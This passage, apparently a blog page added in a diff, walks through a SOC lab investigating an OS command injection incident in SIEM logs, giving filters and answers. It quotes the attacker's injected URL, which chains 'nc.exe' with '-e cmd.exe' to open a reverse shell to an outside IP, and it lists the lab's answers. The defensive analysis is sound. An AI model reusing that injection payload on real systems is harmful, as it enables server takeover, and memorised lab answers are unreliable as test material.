+<li>Subsequent questions require correct answers from previous ones. Answer all questions strictly in the order they appear.</li>
+</ul>
+<h3 id="questions-4">
+  Questions
+  <a class="heading-link" href="#questions-4">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p><strong>Note:</strong> Analyze the logs between “Aug 8, 2024 00:00 — Aug 13, 2024 00:00” to answer the questions below.</p>
+<p><strong>Note</strong>: Subsequent questions require correct answers from previous ones. Answer all questions strictly in the order they appear.</p>
+<blockquote>
+<p><strong>How many distinct IP addresses were detected performing OS Command Injection attacks?</strong></p>
+</blockquote>
+<p>Apply the filters “data.subtype: ips” and “data.attack: OS.Command.Injection.Attempt” in SIEM.</p>
+<p><img src="/images/1_xvYO8uj6fd302UmPHP8kdw.png" alt=""></p>
+<p><strong>Answer:</strong> 4</p>
+<blockquote>
+<p><strong>How many distinct target servers were attacked by the IP addresses performing “OS Command Injection”?</strong></p>
+</blockquote>
+<p>In SIEM, use the filters “data.subtype: ips” and “data.attack: OS.Command.Injection.Attempt”, then check the values in the “data.dstip” field.</p>
+<p><img src="/images/1_FzM8zurzYJ11FfjQhgSgvA.png" alt=""></p>
+<p><strong>Answer:</strong> 1</p>
+<blockquote>
+<p><strong>Which APT group is associated with the IP address reported by the CTI platform (LetsDefend — Threat Intel) as conducting an OS Command Injection attack?</strong></p>
+</blockquote>
+<p>Search the “OS Command Injection” attacker IP(s) on the CTI platform.</p>
+<p><img src="/images/1_7DlwO1oM86g_8tcWd3qobg.png" alt=""></p>
+<p><strong>Answer:</strong> APT-ZF-41</p>
+<blockquote>
+<p><strong>According to IPS/IDS logs, how many distinct unblocked “OS Command Injection” attacks were there?</strong></p>
+</blockquote>
+<p>Filter SIEM logs with “data.subtype: ips” and “data.attack: OS.Command.Injection.Attempt”, then check the “action” field.</p>
+<p><img src="/images/1_4mItzGmdC0-rfXkXAbZJ7A.png" alt=""></p>
+<p><strong>Answer:</strong> 1</p>
+<blockquote>
+<p><strong>What command was executed on the target server during the “OS Command Injection” attack to establish a remote connection?</strong></p>
+</blockquote>
+<p>Apply SIEM filters “data.subtype: ips”, “data.attack: OS.Command.Injection.Attempt”, and “data.action: alert”, then check the “data.url” field.</p>
+<p><a href="https://18.188.96.239/app/news_page.php?file=config.txt&amp;&amp;nc.exe%2046.88.3.4%20443%20-e%20cmd.exe"  class="external-link" target="_blank" rel="noopener">news_page.php?file=config.txt&amp;&amp;nc.exe 46.88.3.4 443 -e cmd.exe</a></p>
+<p><strong>Answer:</strong> nc.exe</p>
+<blockquote>
+<p><strong>What was the “parent process” of the command executed during the “OS Command Injection” attack on the target server?</strong></p>
+</blockquote>
+<p>Filter SIEM logs with “agent.ip: [IP_Address]” and “rule.groups: sysmon”, then review the “data.win.eventdata.parentImage” field.</p>
+<p><img src="/images/1_E2LKey3LyFSUTv01QWYjag.png" alt=""></p>
+<p><strong>Answer:</strong> w3wp.exe</p>
+<blockquote>
+<p><strong>What was the “username” of the user who executed the command in the “OS Command Injection” attack on the target server?</strong></p>
+</blockquote>
+<p>Use SIEM filters “agent.ip: [IP_Address]” and “rule.groups: sysmon”, then check the “data.win.eventdata.user” field.</p>
+<p><strong>Answer:</strong> SYSTEM</p>
+<blockquote>
+<p><strong>How many unique IP addresses performed “OS Command Injection” attacks using the “POST method”?</strong></p>
+</blockquote>
+<p>Filter SIEM logs with “data.subtype: ips” and “data.attack: OS.Command.Injection.Attempt”, then inspect the “data.method” field.,</p>
+<p><img src="/images/1_MLkQjJOXfNknbAQzbqkqCg.png" alt=""></p>
+<p><strong>Answer:</strong> 1</p>
+<blockquote>
+<p><strong>What was the “target IP address” for the attempted connection during the “OS Command Injection” attack?</strong></p>
+</blockquote>
+<p>Apply SIEM filters “data.subtype: ips”, “data.attack: OS.Command.Injection.Attempt”, and “data.action: alert”, then check the “data.url” field.</p>
+<p><strong>Answer:</strong> 46.88.3.4</p>
+<blockquote>
+<p><strong>What is the “logid” of the log that displays a successful connection to the external IP address via an OS command injection attack?</strong></p>
+</blockquote>
+<p>Search the IP address obtained in the previous step in SIEM using “data.dstip: [IP_Address]” and “data.action: accept” filters.</p>
+<p><img src="/images/1_rymcMnw4kno5ewVZ989oPw.png" alt=""></p>
+<p><strong>Answer:</strong> 0642134672</p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+    2026
+     Yusuf Arbac 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.js"></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
